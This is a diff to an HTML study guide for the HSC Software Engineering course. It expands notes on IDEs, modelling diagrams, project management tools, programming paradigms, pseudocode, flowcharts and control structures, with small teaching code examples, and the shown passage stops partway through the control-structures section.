@@ -79,225 +79,1457 @@
     <aside class="sidebar">
       <div class="toc-title">Specifications</div>
       <ul class="toc-list">
-        <li style="font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--accent);padding:.25rem 0 .1rem;">Design & Project Management</li>
-        <li><a href="#modelling-tools">🏗️ 1. Modelling Tools</a></li>
-        <li><a href="#project-management">📋 2. Project Management</a></li>
-        <li style="font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--accent);padding:.75rem 0 .1rem;">Programming & Algorithms</li>
-        <li><a href="#programming-paradigms">⌨️ 3. Programming Paradigms</a></li>
-        <li><a href="#algorithms-logic">📝 4. Algorithms & Logic</a></li>
-        <li><a href="#data-structures">🕹️ 5. Control Structures</a></li>
-        <li style="font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--accent);padding:.75rem 0 .1rem;">Data & Software Solutions</li>
-        <li><a href="#relational-databases">🗄️ 6. Relational Databases (SQL)</a></li>
-        <li><a href="#testing-methods">🧪 7. Testing & Representation</a></li>
-        <li style="font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--accent);padding:.75rem 0 .1rem;">Mechatronics & Emerging Tech</li>
-        <li><a href="#mechatronics">🦾 8. Mechatronics Wiring</a></li>
-        <li><a href="#web-machine-learning">🌐 9. Web & Machine Learning</a></li>
+        <li><a href="#ide-tools">0. IDE &amp; Development Tools</a></li>
+        <li><a href="#modelling-tools">1. System &amp; Data Modelling Tools</a></li>
+        <li><a href="#project-management">2. Project Management Tools</a></li>
+        <li><a href="#programming-paradigms">3. Programming Paradigms</a></li>
+        <li><a href="#algorithms">4. Algorithms</a></li>
+        <li><a href="#control-structures">5. Control Structures</a></li>
+        <li><a href="#subroutines">6. Subroutines</a></li>
+        <li><a href="#relational-databases">7. Relational Databases</a></li>
+        <li><a href="#mechatronics">8. Wiring Diagrams</a></li>
+        <li><a href="#web-programming">9. Programming for the Web</a></li>
+        <li><a href="#machine-learning">10. Machine Learning</a></li>
+        <li><a href="#testing-methods">11. Methods for Testing</a></li>
+        <li><a href="#character-representation">12. Character Representation</a></li>
+        <li><a href="#python">13. Programming with Python</a></li>
+        <li><a href="#git-workflow">14. Git &amp; Version Control</a></li>
+        <li><a href="#testing-frameworks">15. Testing Frameworks</a></li>
+        <li><a href="#cicd">16. CI/CD</a></li>
       </ul>
     </aside>
 
     <main class="page-content">
       <div class="content-body">
 
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <!--  FOCUS AREA 1: DESIGN & PROJECT MANAGEMENT              -->
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <div class="part-block">
-          <span class="part-number">Focus Area 1</span>
-          <span class="part-name">📐 Design & Project Management</span>
-        </div>
+        <!-- 0. IDE & Development Tools -->
+        <section id="ide-tools">
+          <h2 class="syllabus-phase">💻 IDE &amp; Development Tools</h2>
+          <p>An <strong>Integrated Development Environment (IDE)</strong> combines a code editor, build tools, debugger, and other features into a single application. A plain <strong>text editor</strong> (e.g. Notepad, nano) only edits text — you must run all other tools separately.</p>
 
-        <!-- 1. Modelling Tools -->
-        <section id="modelling-tools">
-          <h2 class="syllabus-phase">📊 System and Data Modelling Tools</h2>
-          
-          <h3>📊 Data Flow Diagrams (DFD)</h3>
-          <p>Used to represent the flow of data through an information system.</p>
+          <h3>IDE vs Text Editor — Feature Comparison</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Feature</th><th>Text Editor</th><th>IDE</th></tr>
+              </thead>
+              <tbody>
+                <tr><td>Syntax highlighting</td><td>Basic / plugin</td><td>Built-in, language-aware</td></tr>
+                <tr><td>IntelliSense / autocomplete</td><td>Rarely</td><td>Yes — context-aware suggestions</td></tr>
+                <tr><td>Integrated debugger</td><td>No</td><td>Yes — breakpoints, watch variables</td></tr>
+                <tr><td>Refactoring tools</td><td>No</td><td>Yes — rename, extract, inline</td></tr>
+                <tr><td>Extensions / plugins</td><td>Limited</td><td>Large ecosystem</td></tr>
+                <tr><td>Integrated terminal</td><td>Rarely</td><td>Yes — run commands without leaving the editor</td></tr>
+                <tr><td>Version control integration</td><td>No</td><td>Yes — diff, commit, branch from sidebar</td></tr>
+                <tr><td>Linter / static analysis</td><td>Plugin only</td><td>Built-in or first-class plugin</td></tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h3>VS Code — Setup for Python</h3>
+          <p>Visual Studio Code is a lightweight, free IDE by Microsoft with a vast extension library. Recommended extensions for Python HSC work:</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>⭕ Circle</strong><span>Process — uses input to generate output.</span></div>
-            <div class="key-term-item"><strong>🗃️ Open Rectangle</strong><span>Data Store — file or non-computer storage.</span></div>
-            <div class="key-term-item"><strong>🏢 Rectangle</strong><span>External Entity — source or sink of data.</span></div>
-            <div class="key-term-item"><strong>↩️ Curved Arrow</strong><span>Data Flow — movement of data between elements.</span></div>
+            <div class="key-term-item"><strong>Python (ms-python)</strong><span>Provides IntelliSense, linting, debugging, and environment selection for Python files.</span></div>
+            <div class="key-term-item"><strong>Pylance</strong><span>Fast, feature-rich language server that powers type checking and smart autocomplete beyond the base Python extension.</span></div>
+            <div class="key-term-item"><strong>GitLens</strong><span>Enhances the built-in Git support — shows inline blame annotations, commit history, and file comparison.</span></div>
+          </div>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">JSON — .vscode/settings.json basics</span></div>
+            <pre><code>{
+  "editor.fontSize": 14,
+  "editor.tabSize": 4,
+  "editor.formatOnSave": true,
+  "python.defaultInterpreterPath": "${workspaceFolder}/venv/bin/python",
+  "python.linting.enabled": true,
+  "python.linting.pylintEnabled": true,
+  "editor.rulers": [79],
+  "files.trimTrailingWhitespace": true
+}</code></pre>
+          </div>
+
+          <h3>PyCharm — Setup for Python</h3>
+          <p>PyCharm (JetBrains) is a full Python IDE with deeper analysis than VS Code. Key setup steps:</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Project Interpreter</strong><span>Set via <em>File → Settings → Project → Python Interpreter</em>. Create or select a virtual environment (venv) specific to your project so packages do not conflict.</span></div>
+            <div class="key-term-item"><strong>Run Configurations</strong><span>Defined in <em>Run → Edit Configurations</em>. Set the script path, working directory, and any environment variables. Allows one-click running or debugging of any file.</span></div>
+          </div>
+
+          <h3>Arduino IDE</h3>
+          <p>Used for programming Arduino microcontrollers (C/C++ dialect). Key features for HSC Mechatronics:</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Board Manager</strong><span>Install support packages for different boards — accessed via <em>Tools → Board → Board Manager</em>. Required when using non-standard boards (e.g. ESP32, Arduino Nano).</span></div>
+            <div class="key-term-item"><strong>Library Manager</strong><span>Install third-party sensor and component libraries via <em>Sketch → Include Library → Manage Libraries</em>. Examples: <code>Servo</code>, <code>DHT sensor library</code>.</span></div>
+            <div class="key-term-item"><strong>Serial Monitor</strong><span>Opens a terminal showing data sent over the USB serial port via <code>Serial.println()</code>. Essential for debugging sensor readings and program state at runtime.</span></div>
+          </div>
+
+          <h3>Thonny — MicroPython on Microcontrollers</h3>
+          <p>Thonny is a beginner-friendly Python IDE designed for education and MicroPython development on boards like Raspberry Pi Pico and ESP32.</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>REPL (Read-Eval-Print Loop)</strong><span>An interactive shell at the bottom of Thonny. Type a Python expression and see the result instantly — useful for testing individual lines before adding them to a script.</span></div>
+            <div class="key-term-item"><strong>File Transfer</strong><span>The <em>Files</em> panel shows both your computer's filesystem and the microcontroller's filesystem side by side. Right-click a file and choose <em>Upload to /</em> to copy it to the board, or <em>Download</em> to retrieve it.</span></div>
+          </div>
+
+          <h3>IDE Features Summary Table</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Feature</th><th>VS Code</th><th>PyCharm</th><th>Arduino IDE</th><th>Thonny</th></tr>
+              </thead>
+              <tbody>
+                <tr><td>Autocomplete</td><td>Yes (Pylance)</td><td>Yes (built-in)</td><td>Limited</td><td>Basic</td></tr>
+                <tr><td>Syntax highlighting</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td></tr>
+                <tr><td>Integrated debugger</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes (MicroPython)</td></tr>
+                <tr><td>Version control integration</td><td>Yes (Git)</td><td>Yes (Git)</td><td>No</td><td>No</td></tr>
+                <tr><td>Linter / static analysis</td><td>Yes (Pylint/Flake8)</td><td>Yes (built-in)</td><td>No</td><td>Limited</td></tr>
+                <tr><td>Refactoring</td><td>Basic</td><td>Advanced</td><td>No</td><td>No</td></tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="callout info">
+            <strong>Which IDE for which HSC task?</strong><br><br>
+            Use <strong>VS Code</strong> for general Python development, web programming tasks, and any project where you want Git integration without a heavyweight install.<br>
+            Use <strong>PyCharm</strong> for larger Python projects that benefit from advanced refactoring, deeper type checking, and database tools (Community Edition is free).<br>
+            Use <strong>Arduino IDE</strong> for all Arduino-based mechatronics tasks — it handles board-specific compilation and serial communication.<br>
+            Use <strong>Thonny</strong> for MicroPython on Raspberry Pi Pico or ESP32 — its built-in file transfer and REPL make deploying to the board fast and simple.
+          </div>
+        </section>
+
+        <hr class="divider" />
+
+        <!-- 1. System and Data Modelling Tools -->
+        <section id="modelling-tools">
+          <h2 class="syllabus-phase">🗺️ System and Data Modelling Tools</h2>
+
+          <h3>📊 Data Flow Diagrams (DFD)</h3>
+          <p>Used to represent the flow of data through an information system. DFDs show <em>what</em> data moves through a system and <em>where</em> it goes — not how or when.</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>⭕ Circle</strong><span>Process — transforms input data into output (e.g. "Validate Login").</span></div>
+            <div class="key-term-item"><strong>🗃️ Open Rectangle</strong><span>Data Store — persistent storage such as a file or database table (e.g. "D1 Users").</span></div>
+            <div class="key-term-item"><strong>🏢 Rectangle</strong><span>External Entity — a person or system outside the boundary that sends or receives data (e.g. "Customer").</span></div>
+            <div class="key-term-item"><strong>↩️ Arrow</strong><span>Data Flow — named arrow showing data moving between elements (e.g. "username + password").</span></div>
           </div>
           <div class="callout info">
-            <strong>Level 0 DFD</strong>: Represents an overview of the entire system; does not show data stores or internal processes.
+            <strong>Level 0 (Context Diagram)</strong>: Shows the entire system as a single process bubble with all external entities. No data stores or sub-processes are shown.<br><br>
+            <strong>Level 1 DFD</strong>: Expands the single bubble into its major processes. Data stores appear at this level. Each process can be further expanded into a Level 2 DFD if needed.
           </div>
+          <p><strong>Example scenario — Online Bookshop:</strong> A <em>Customer</em> (external entity) sends an <em>order request</em> (data flow) to the <em>Process Order</em> (process), which reads from the <em>D1 Book Catalogue</em> (data store) and sends a <em>confirmation</em> back to the customer.</p>
 
-          <h3>🌐 Structure Charts</h3>
-          <p>Represent a system by showing separate subroutines and their relationships.</p>
+          <h3>🏗️ Structure Charts</h3>
+          <p>Represent a system's modular design — showing how subroutines are called from one another in a hierarchy. Modules at the top control modules below them.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>🔘 Empty Circle Arrow</strong><span>Data Movement — passes parameters between modules.</span></div>
-            <div class="key-term-item"><strong>⚫ Filled Circle Arrow</strong><span>Control Flag — passes status variables between modules.</span></div>
-            <div class="key-term-item"><strong>🔷 Diamond</strong><span>Decision — indicates optional or conditional execution.</span></div>
-            <div class="key-term-item"><strong>🔁 Curved Arrow</strong><span>Repetition — indicates a looping structure.</span></div>
+            <div class="key-term-item"><strong>▭ Rectangle</strong><span>Module — a named subroutine or function (e.g. "Calculate Total").</span></div>
+            <div class="key-term-item"><strong>🔘 Empty Circle Arrow</strong><span>Data parameter — a data value passed between modules (e.g. passing a score).</span></div>
+            <div class="key-term-item"><strong>⚫ Filled Circle Arrow</strong><span>Control flag — a status variable passed between modules (e.g. a Boolean "isValid").</span></div>
+            <div class="key-term-item"><strong>🔷 Diamond</strong><span>Selection — indicates a module is called conditionally.</span></div>
+            <div class="key-term-item"><strong>🔁 Curved Arrow</strong><span>Repetition — indicates a module is called inside a loop.</span></div>
+          </div>
+          <div class="callout info">
+            <strong>Example:</strong> A top-level <em>Main</em> module calls <em>GetInput</em>, <em>ProcessData</em>, and <em>DisplayResult</em>. An arrow from <em>GetInput</em> back to <em>Main</em> carries the data parameter <em>userScore</em>.
           </div>
 
-          <h3>📊 Data Dictionary</h3>
-          <p>Comprehensive description of each variable, including: Name, Data Type, Format, Size (bytes/display), Description, Example, and Validation.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Structure Chart — Online Bookshop (text notation)</span></div>
+            <pre><code>MainModule
+├── GetOrder          [🔘 orderDetails passed UP to MainModule]
+│     ├── ValidateISBN      [⚫ isValid flag returned]
+│     └── CheckStock        [⚫ stockAvailable flag returned]
+├── ProcessPayment    [🔘 amount, 🔁 retry loop if payment fails]
+│     ├── ChargeCard        [⚫ paymentSuccess flag returned]
+│     └── SendReceipt       [🔘 email, orderID]
+└── UpdateInventory   [🔘 ISBN, quantitySold]
+
+Legend: 🔘 data parameter  ⚫ control flag  🔁 loop  ◇ conditional call</code></pre>
+          </div>
+
+          <h3>📋 Data Dictionary</h3>
+          <p>A structured reference that documents every variable and data element in a system. Each entry includes: <strong>Name, Data Type, Format, Size, Description, Example value, and Validation rules</strong>.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Name</th><th>Data Type</th><th>Format</th><th>Size</th><th>Description</th><th>Example</th><th>Validation</th></tr>
+              </thead>
+              <tbody>
+                <tr><td><code>studentID</code></td><td>Integer</td><td>XXXXXX</td><td>6 digits</td><td>Unique student identifier</td><td>482019</td><td>Must be 6 digits, not null</td></tr>
+                <tr><td><code>surname</code></td><td>String</td><td>Text</td><td>50 chars</td><td>Student's family name</td><td>Smith</td><td>Letters only, not empty</td></tr>
+                <tr><td><code>score</code></td><td>Real</td><td>##.#</td><td>4 bytes</td><td>Exam score out of 100</td><td>87.5</td><td>0.0 ≤ score ≤ 100.0</td></tr>
+                <tr><td><code>dateOfBirth</code></td><td>Date</td><td>DD/MM/YYYY</td><td>10 chars</td><td>Student's date of birth</td><td>14/03/2007</td><td>Valid calendar date</td></tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h3>🧩 Class Diagrams</h3>
+          <p>Used in object-oriented design to show classes, their attributes, methods, and the relationships between them. Each class is drawn as a box divided into three compartments.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Class Diagram — Example</span></div>
+            <pre><code>┌─────────────────────┐
+│       Student       │  ← Class name
+├─────────────────────┤
+│ - studentID: int    │  ← Attributes (- private, + public)
+│ - name: String      │
+│ - score: float      │
+├─────────────────────┤
+│ + getScore(): float │  ← Methods
+│ + setScore(s: float)│
+│ + isPassing(): bool │
+└─────────────────────┘
+
+     Student ──────▷ Person      (Inheritance: Student extends Person)
+     Course  ◆───── Lesson       (Composition: Course owns its Lessons)
+     Student ──────  Course      (Association: Student enrols in Course)</code></pre>
+          </div>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>— (solid line)</strong><span>Association — a general relationship between two classes.</span></div>
+            <div class="key-term-item"><strong>▷ (open arrow)</strong><span>Inheritance — a subclass extends a superclass (is-a relationship).</span></div>
+            <div class="key-term-item"><strong>◇ (open diamond)</strong><span>Aggregation — a "has-a" relationship; parts can exist independently.</span></div>
+            <div class="key-term-item"><strong>◆ (filled diamond)</strong><span>Composition — parts cannot exist without the whole (strong ownership).</span></div>
+          </div>
+
+          <h3>🖼️ Storyboard</h3>
+          <p>A visual sequence of annotated screen layouts showing the user's journey through a system. Created in the design phase before any code is written, storyboards allow stakeholders to review and approve the interface before development begins.</p>
+          <p>Each frame in a storyboard typically includes:</p>
+          <ul>
+            <li>A <strong>sketch or wireframe</strong> of the screen layout</li>
+            <li>The <strong>screen name or state</strong> (e.g. "Login Screen", "Results Page")</li>
+            <li><strong>Navigation arrows</strong> showing what triggers the transition to the next screen (e.g. "Click Submit")</li>
+            <li>Notes on <strong>input fields, buttons, and displayed data</strong></li>
+          </ul>
+
+          <div class="callout info">
+            <strong>Design phase:</strong> Storyboards are created <em>before any code is written</em> — during the Design phase of the SDLC. They allow clients to approve the interface and user flow before development begins, which avoids costly rework. For the HSC project, a storyboard typically shows 4–8 frames: a home/login screen, a main feature screen, an input form, and a results/output screen.
+          </div>
+
+          <h3>🌳 Decision Trees</h3>
+          <p>A tree-based diagram that models decision logic. Starting from a root condition, each branch represents a possible outcome of a test. Decision trees are useful for representing complex nested logic clearly.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Decision Tree — Exam Grade Example</span></div>
+            <pre><code>Is score ≥ 90?
+├── YES → Grade: A
+└── NO
+    Is score ≥ 75?
+    ├── YES → Grade: B
+    └── NO
+        Is score ≥ 50?
+        ├── YES → Grade: C
+        └── NO → Grade: Fail</code></pre>
+          </div>
         </section>
 
         <hr class="divider" />
 
-        <!-- 2. Project Management -->
+        <!-- 2. Project Management Tools -->
         <section id="project-management">
           <h2 class="syllabus-phase">📋 Project Management Tools</h2>
+
           <h3>📈 Gantt Charts</h3>
-          <p>Displays component tasks on an estimated timeline, showing dependencies and milestones.</p>
+          <p>A horizontal bar chart that displays all project tasks against a timeline, making it easy to see what needs to happen, in what order, and how long each task should take.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Task</th><th>Week 1</th><th>Week 2</th><th>Week 3</th><th>Week 4</th><th>Depends on</th></tr>
+              </thead>
+              <tbody>
+                <tr><td>Requirements analysis</td><td>████</td><td></td><td></td><td></td><td>—</td></tr>
+                <tr><td>Design (DFD, structure chart)</td><td>░░</td><td>████</td><td></td><td></td><td>Requirements</td></tr>
+                <tr><td>Coding</td><td></td><td>░░</td><td>████</td><td>░░</td><td>Design</td></tr>
+                <tr><td>Testing</td><td></td><td></td><td>░░</td><td>████</td><td>Coding</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Task bars</strong><span>Horizontal bars showing the planned start, duration, and end of each task.</span></div>
+            <div class="key-term-item"><strong>Dependencies</strong><span>Arrows or indentation indicating which tasks must finish before another can begin.</span></div>
+            <div class="key-term-item"><strong>Milestones</strong><span>Key checkpoints (often shown as a diamond ◆) marking a significant completion point.</span></div>
+            <div class="key-term-item"><strong>Critical path</strong><span>The sequence of dependent tasks that determines the minimum project duration.</span></div>
+          </div>
+
           <h3>📝 Process Diaries / Log Books</h3>
-          <p>Regular interval documentation of progress, tasks achieved, stumbling blocks, and reflective comments.</p>
+          <p>A regular written record kept throughout the project. Entries are made at consistent intervals (e.g. after each work session, weekly, or at each milestone) and serve as evidence of the development process.</p>
+          <p>A typical log entry includes:</p>
+          <ul>
+            <li><strong>Date and time</strong> of the session</li>
+            <li><strong>Tasks completed</strong> — what was achieved</li>
+            <li><strong>Obstacles encountered</strong> — bugs, design problems, or blockers</li>
+            <li><strong>Next steps</strong> — what will be attempted in the next session</li>
+            <li><strong>Reflective comments</strong> — what was learned or what could be improved</li>
+          </ul>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Process Diary — Example Entry</span></div>
+            <pre><code>Date: 14 March 2025    Session duration: 90 minutes
+
+Tasks completed:
+  - Implemented the login form with input validation (Python / Flask)
+  - Updated Gantt chart: testing phase pushed back 2 days
+
+Stumbling blocks:
+  - The input sanitisation function was stripping "+" characters from
+    valid email addresses (e.g. user+tag@example.com)
+
+Solutions applied:
+  - Updated the regex to r'^[\w.+\-]+@[\w\-]+\.[\w.]+$'
+  - Verified against RFC 5321 which confirms "+" is legal in the local part
+
+Next steps:
+  - Write unit tests for the validate_email() function
+  - Begin designing the database schema
+
+Reflective comment:
+  - This bug took longer than expected. In future I should test
+    edge cases during coding rather than discovering them in testing.</code></pre>
+          </div>
+          <div class="callout info">
+            In the HSC Software Engineering Project, your process diary is submitted as evidence of your development approach and is assessed alongside your final solution.
+          </div>
         </section>
 
         <hr class="divider" />
-
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <!--  FOCUS AREA 2: PROGRAMMING & ALGORITHMS                  -->
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <div class="part-block">
-          <span class="part-number">Focus Area 2</span>
-          <span class="part-name">⌨️ Programming & Algorithms</span>
-        </div>
 
         <!-- 3. Programming Paradigms -->
         <section id="programming-paradigms">
           <h2 class="syllabus-phase">⌨️ Programming Paradigms</h2>
+          <p>A programming paradigm is a fundamental style or approach to solving problems with code. Different paradigms suit different types of problems.</p>
           <div class="info-grid">
             <div class="info-card">
               <h4>🧩 Object-Oriented</h4>
-              <p>Classes, objects, attributes, methods, inheritance, polymorphism, and encapsulation.</p>
+              <p>Organises code into <strong>classes</strong> and <strong>objects</strong>. Key concepts: attributes, methods, inheritance, polymorphism, and encapsulation. Used in Python, Java, C#.</p>
+              <pre style="font-size:.78rem;margin-top:.5rem"><code>class Dog:
+    def __init__(self, name):
+        self.name = name
+    def bark(self):
+        return "Woof!"</code></pre>
             </div>
             <div class="info-card">
               <h4>📝 Logic</h4>
-              <p>Facts, rules, and displaying solutions/rules used by the system.</p>
+              <p>Programs are expressed as <strong>facts</strong> and <strong>rules</strong>; the engine finds solutions automatically. Used in Prolog for AI and expert systems.</p>
+              <pre style="font-size:.78rem;margin-top:.5rem"><code>% Prolog-style logic
+parent(tom, bob).
+parent(bob, ann).
+grandparent(X, Z) :-
+    parent(X, Y), parent(Y, Z).</code></pre>
             </div>
             <div class="info-card">
-              <h4>📊 Imperative</h4>
-              <p>Control structures, assignment statements, expressions, and subroutines.</p>
+              <h4>🖥️ Imperative</h4>
+              <p>Programs describe <strong>how</strong> to do something as a sequence of commands — control structures, assignment, expressions, and subroutines. Most common paradigm; used in Python, C, Pascal.</p>
+              <pre style="font-size:.78rem;margin-top:.5rem"><code>total = 0
+for i in range(1, 6):
+    total = total + i
+print(total)  # 15</code></pre>
             </div>
             <div class="info-card">
               <h4>⚙️ Functional</h4>
-              <p>Recursion, first-class objects, abstraction, and encapsulation.</p>
+              <p>Treats computation as evaluating <strong>functions</strong>. Avoids changing state; uses recursion and first-class functions. Used in Haskell, Erlang; supported in Python.</p>
+              <pre style="font-size:.78rem;margin-top:.5rem"><code># Python functional style
+nums = [1, 2, 3, 4, 5]
+total = sum(map(lambda x: x*2, nums))
+print(total)  # 30</code></pre>
             </div>
           </div>
         </section>
 
         <hr class="divider" />
 
-        <!-- 4. Algorithms & Logic -->
-        <section id="algorithms-logic">
-          <h2 class="syllabus-phase">📝 Algorithms and Logic</h2>
-          <h3>💻 Pseudocode Standards</h3>
-          <p>Keywords in <strong>CAPITALS</strong>, structural elements in pairs (BEGIN/END, IF/ENDIF), and indentation for control structures.</p>
-          
-          <h3>🌊 Flowchart Symbols</h3>
+        <!-- 4. Algorithms -->
+        <section id="algorithms">
+          <h2 class="syllabus-phase">📝 Algorithms</h2>
+          <p>An algorithm is a precise, step-by-step set of instructions for solving a problem. In HSC Software Engineering, algorithms are communicated using <strong>pseudocode</strong> or <strong>flowcharts</strong>.</p>
+
+          <h3>💻 Pseudocode</h3>
+          <p>A structured English-like notation for expressing algorithms. It is not executable code — it communicates logic without worrying about syntax. NSW HSC conventions:</p>
+          <ul>
+            <li>Keywords in <strong>CAPITALS</strong> (e.g. <code>IF</code>, <code>WHILE</code>, <code>FOR</code>)</li>
+            <li>Structural keywords come in matched pairs: <code>IF / ENDIF</code>, <code>WHILE / ENDWHILE</code>, <code>BEGIN / END</code></li>
+            <li>Indent the body of every control structure</li>
+            <li>Use <code>←</code> for assignment (e.g. <code>total ← 0</code>)</li>
+          </ul>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Find the largest number in a list</span></div>
+            <pre><code>BEGIN
+  INPUT numbers        # A list of numbers entered by the user
+  largest ← numbers[0]
+  FOR i = 1 TO LENGTH(numbers) - 1
+    IF numbers[i] > largest THEN
+      largest ← numbers[i]
+    ENDIF
+  NEXT i
+  OUTPUT "Largest value: ", largest
+END</code></pre>
+          </div>
+
+          <h3>🌊 Flowcharts</h3>
+          <p>A visual diagram using standardised shapes connected by arrows to show the flow of logic through an algorithm.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>🔵 Oval</strong><span>Terminator — marks the Start or End of a flowchart.</span></div>
-            <div class="key-term-item"><strong>📐 Parallelogram</strong><span>Input/Output — represents data entering or leaving the system.</span></div>
-            <div class="key-term-item"><strong>▭ Rectangle</strong><span>Process — a computation or action step.</span></div>
-            <div class="key-term-item"><strong>🔶 Diamond</strong><span>Decision — a branching condition (Yes/No or True/False).</span></div>
-            <div class="key-term-item"><strong>🗂️ Double-sided Rectangle</strong><span>Subprogram — a call to a separate subroutine or function.</span></div>
+            <div class="key-term-item"><strong>🔵 Oval</strong><span>Terminator — marks the <em>Start</em> or <em>End</em> of the algorithm.</span></div>
+            <div class="key-term-item"><strong>📐 Parallelogram</strong><span>Input/Output — data entering (INPUT) or leaving (OUTPUT/DISPLAY) the system.</span></div>
+            <div class="key-term-item"><strong>▭ Rectangle</strong><span>Process — a computation, assignment, or action (e.g. <code>total ← total + score</code>).</span></div>
+            <div class="key-term-item"><strong>🔶 Diamond</strong><span>Decision — a yes/no or true/false branch (e.g. <code>score ≥ 50?</code>).</span></div>
+            <div class="key-term-item"><strong>🗂️ Double-sided Rectangle</strong><span>Subprogram — a call to a named subroutine or function.</span></div>
+          </div>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Flowchart — Find the largest number in a list (text diagram)</span></div>
+            <pre><code>        ╔══════════╗
+        ║  START   ║   ← Oval terminator
+        ╚════╤═════╝
+             │
+     ╔═══════╧════════╗
+     ║  largest ← 0   ║   ← Process rectangle
+     ║  i ← 1         ║
+     ╚═══════╤════════╝
+             │
+     ╔═══════╧════════╗
+     ║  INPUT number  ║   ← Parallelogram (input)
+     ╚═══════╤════════╝
+             │
+        ╔════╧═════╗
+        ║ number > ║   ← Diamond (decision)
+        ║ largest? ║
+        ╚═╤══════╤═╝
+       YES│      │NO
+          ▼      │
+  ╔═══════════╗  │
+  ║ largest ← ║  │   ← Process
+  ║  number   ║  │
+  ╚═════╤═════╝  │
+        └────────┘
+             │
+        ╔════╧═════╗
+        ║  i < n?  ║   ← Loop back if more numbers remain
+        ╚═╤══════╤═╝
+       YES│      │NO
+          │      ▼
+          │  ╔══════════════╗
+          │  ║ OUTPUT       ║   ← Parallelogram (output)
+          │  ║ largest      ║
+          │  ╚══════╤═══════╝
+          │         │
+          │    ╔════╧═════╗
+          │    ║   END    ║   ← Oval terminator
+          │    ╚══════════╝
+          │
+     (loop back to INPUT)</code></pre>
+          </div>
+          <div class="callout info">
+            <strong>Pseudocode vs Flowcharts:</strong> Both express the same algorithm. Pseudocode is preferred for complex logic and is easier to convert to code. Flowcharts are better for visualising branching and communicating with non-programmers.
           </div>
         </section>
 
         <hr class="divider" />
 
         <!-- 5. Control Structures -->
-        <section id="data-structures">
+        <section id="control-structures">
           <h2 class="syllabus-phase">🕹️ Control Structures</h2>
-          <div class="table-wrap">
-            <table>
-              <thead><tr><th>Structure</th><th>Pseudocode Example</th></tr></thead>
-              <tbody>
-                <tr><td>Binary Selection</td><td><code>IF condition THEN ... ELSE ... ENDIF</code></td></tr>
-                <tr><td>Multi-way Selection</td><td><code>CASEWHERE expression ... OTHERWISE ... END CASE</code></td></tr>
-                <tr><td>Pre-test Loop</td><td><code>WHILE condition is true ... ENDWHILE</code></td></tr>
-                <tr><td>Post-test Loop</td><td><code>REPEAT ... UNTIL condition is true</code></td></tr>
-                <tr><td>Counted Loop</td><td><code>FOR variable = start TO finish STEP increment ... NEXT variable</code></td></tr>
-              </tbody>
-            </table>
+          <p>Control structures determine the <em>order</em> in which instructions execute. Every algorithm is built from three fundamental building blocks: <strong>Sequence</strong>, <strong>Selection</strong>, and <strong>Repetition</strong>.</p>
+
+          <h3>Sequence</h3>
+          <p>The default mode — statements execute one after another, top to bottom, in the exact order they are written. No branching or repetition occurs.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Calculate a student's average</span></div>
+            <pre><code>BEGIN
+  INPUT score1
+  INPUT score2
+  INPUT score3
+  total ← score1 + score2 + score3
+  average ← total / 3
+  OUTPUT "Average score: ", average
+END</code></pre>
+          </div>
+
+          <h3>Selection</h3>
+          <p>Allows the program to choose between different paths based on a condition.</p>
+
+          <h4>Binary Selection</h4>
+          <p>Chooses between exactly <strong>two</strong> outcomes: one path if the condition is true, another if it is false.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Pass or fail</span></div>
+            <pre><code>IF score >= 50 THEN
+  OUTPUT "Result: Pass"
+ELSE
+  OUTPUT "Result: Fail"
+ENDIF</code></pre>
+          </div>
+
+          <h4>Multi-way Selection</h4>
+          <p>Selects from <strong>several</strong> possible outcomes based on a single expression's value. More readable than a chain of IF/ELSE IF.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Menu selection</span></div>
+            <pre><code>CASEWHERE menuChoice equals
+  1: OUTPUT "New Game"
+  2: OUTPUT "Load Game"
+  3: OUTPUT "High Scores"
+  OTHERWISE: OUTPUT "Invalid choice"
+END CASE</code></pre>
+          </div>
+
+          <h4>Nested IF</h4>
+          <p>An IF structure placed inside another IF. Used when a decision depends on the result of a previous decision.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Grade with age check</span></div>
+            <pre><code>IF score >= 50 THEN
+  IF score >= 85 THEN
+    OUTPUT "Grade: A (Distinction)"
+  ELSE
+    OUTPUT "Grade: Pass"
+  ENDIF
+ELSE
+  OUTPUT "Grade: Fail — please see your teacher"
+ENDIF</code></pre>
+          </div>
+
